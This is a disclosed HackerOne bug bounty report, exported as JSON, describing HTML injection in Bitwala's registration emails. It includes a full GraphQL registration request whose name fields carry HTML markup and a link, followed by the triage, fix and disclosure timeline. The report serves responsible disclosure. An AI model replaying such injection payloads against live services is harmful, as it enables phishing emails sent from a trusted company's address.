{"id":786976,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODY5NzY=","url":"https://hackerone.com/reports/786976","title":"HTML injection in email content","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-01-31T17:12:29.088Z","submitted_at":"2020-01-31T17:12:29.088Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lamscun","url":"/lamscun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/9bUpR9WmHrpUT9XyHYDJNicG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41380,"url":"https://hackerone.com/bitwala","handle":"bitwala","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/380/5ee95025b31bd67f2c5df7c138f1914268df51f2_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/380/5ee95025b31bd67f2c5df7c138f1914268df51f2_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Bitwala","twitter_handle":"","website":"https://www.bitwala.com","about":"Learn more about Bitwala at https://www.bitwala.com/about"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-14T20:01:53.588Z","bug_reporter_agreed_on_going_public_at":"2020-07-15T20:01:53.218Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nHi,\n\nI just found an issue when register account in https://app.bitwala.com/onboarding/preliminary. It allow hacker injection malicious text include html code in email content.\n## Steps To Reproduce:\nMake request register below with **payload html** in ==firstName== and ==lastName== parameter:\n\n```\nPOST /graphql HTTP/1.1\nHost: api.app.bitwala.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/json\nAuthorization: null\nOrigin: https://app.bitwala.com\nContent-Length: 1188\nConnection: close\n\n{\"operationName\":\"createIneligibleUser\",\"variables\":{\"ineligibleUser\":{\"email\":\"dr.eamhope.aaa@gmail.com\",\"firstName\":\"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22\u003cb\u003ehello\u003c/b\u003e\u003ch1\u003ehacker\u003c/h1\u003e\u003ca href='abc.com'\u003eXXXX\u003c/a\u003eabc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc\",\"lastName\":\"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22\u003cb\u003ehello\u003c/b\u003e\u003ch1\u003ehacker\u003c/h1\u003e\u003ca href='abc.com'\u003eXXXX\u003c/a\u003eabc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc\",\"addressCountry\":\"US\",\"marketing\":true,\"locale\":\"en\",\"token\":\"03AOLTBLRo4xtiJjci3-KF9cyHrmtCDjr-BORRjZT58NooOV6fkr4VLeRL2SqgVeXdX1NiJQCI6BHk97El0aKwJBuc9iUmtuxvZdvISyEZ4rYVgm3lEG8XxBBuhJzh0L_vUNBdbiOLGjoZyJgGf4R_Y6unX-dg7Wn4kjWDYkE25QIaGFNxS3YzDmp0e3GmN47UhZjpp14KIlfP9dpUqqleJytN2nJs068HfMjZM9d-7Etfv3YG0brkyVP_nMxXouKZARX9d1o7AXMGyykqDWVeB8e0iIuuFHpNkjEIqDVi6Af6Ch87fM5gXwDgr86PAzKyA-vrUZoahuhKhG71N-soh8gn_XsEiqCSGyS76ox20kr40diSu7Hh8Hzt_hKeZ_sMQd_yHqjpbBxkFO_jWSzkpcExmpBb4qHlFW_JrDNEi5gVXeGA3ZJ8CKk\",\"identificationDocumentType\":\"DE:PASSPORT_ID_CARD\"}},\"query\":\"mutation createIneligibleUser($ineligibleUser: CreateIneligibleUserInput!) {\\n  createIneligibleUser(ineligibleUser: $ineligibleUser)\\n}\\n\"}\n```\n \nPOC: {F702310}\n\n## Impact\n\nHTML injection, Phishing attacks\nThis vulnerability can lead to the reformatting/editing of emails from an official email address, which can be used in targeted phishing attacks.\nThis could lead to users being tricked into giving logins away to malicious attackers.","original_report_id":null,"original_report_url":null,"attachments":[{"id":702310,"file_name":"html_injection_email.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/M6mfFe9GWQPfdFyvFDGM1k52?response-content-disposition=attachment%3B%20filename%3D%22html_injection_email.png%22%3B%20filename%2A%3DUTF-8%27%27html_injection_email.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4dafa0a92544cda1f278d73485cb7fa7b9d98e8230ec5d97065a5d111f5687a5","file_size":54920,"type":"image/png"}],"allow_singular_disclosure_at":"2020-08-14T20:01:53.280Z","allow_singular_disclosure_after":-36530746.763053134,"singular_disclosure_allowed":true,"vote_count":27,"voters":["thaivu","ali","impramodsargar","zimmer75","sa1tama0","sheerwood","rubyhack","lustigo","mohamouddahir1997","bc4b5f39ded739ad062bffc","and 17 more..."],"severity":{"rating":"medium","score":5.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":36177,"asset_type":"URL","asset_identifier":"api.app.bitwala.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6934383,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Other poc:\n{F702329}","automated_response":false,"created_at":"2020-01-31T17:32:43.839Z","updated_at":"2020-01-31T17:32:43.839Z","actor":{"username":"lamscun","cleared":false,"url":"/lamscun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9bUpR9WmHrpUT9XyHYDJNicG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":702329,"filename":"html_injection_email2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GarpaiXL2J41fEVTZJkwdw86?response-content-disposition=attachment%3B%20filename%3D%22html_injection_email2.png%22%3B%20filename%2A%3DUTF-8%27%27html_injection_email2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=696b3ae4c3fa1115814755f7e7f5c23d460ba65a0ee6127e0294a9f4310933fb"}],"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7049338,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @Bitwala,\n\nAny updates in there?I have been waiting for a long time.\n\nThanks,\n@lamscun ","automated_response":false,"created_at":"2020-02-14T02:03:12.594Z","updated_at":"2020-02-14T02:03:12.594Z","actor":{"username":"lamscun","cleared":false,"url":"/lamscun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9bUpR9WmHrpUT9XyHYDJNicG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7071882,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-17T15:19:59.364Z","updated_at":"2020-02-17T15:19:59.364Z","additional_data":{"old_severity":"High","new_severity":"Medium (5.6)","old_severity_id":622463,"new_severity_id":635447},"actor":{"username":"team_bitwala","cleared":false,"url":"/team_bitwala","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UQedAzFC67ydeeGThtiWumfV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7071910,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @iamscun,\nthank you for your submission. We triaged the issue and are working on a fix\n\nI'll get back to you once the fix is released.\n\nBest,\n","automated_response":false,"created_at":"2020-02-17T15:22:46.224Z","updated_at":"2020-02-17T15:22:46.224Z","actor":{"username":"team_bitwala","cleared":false,"url":"/team_bitwala","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UQedAzFC67ydeeGThtiWumfV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7854791,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-04-30T17:15:21.059Z","updated_at":"2020-04-30T17:15:21.059Z","actor":{"username":"team_bitwala","cleared":false,"url":"/team_bitwala","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UQedAzFC67ydeeGThtiWumfV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"lamscun","url":"/lamscun"},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8611981,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-15T20:01:53.248Z","updated_at":"2020-07-15T20:01:53.248Z","first_to_agree":true,"actor":{"username":"lamscun","cleared":false,"url":"/lamscun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9bUpR9WmHrpUT9XyHYDJNicG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8941931,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-08-14T20:01:53.624Z","updated_at":"2020-08-14T20:01:53.624Z","actor":{"url":"/bitwala","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/380/5ee95025b31bd67f2c5df7c138f1914268df51f2_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Bitwala"}},"genius_execution_id":null,"team_handle":"bitwala","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}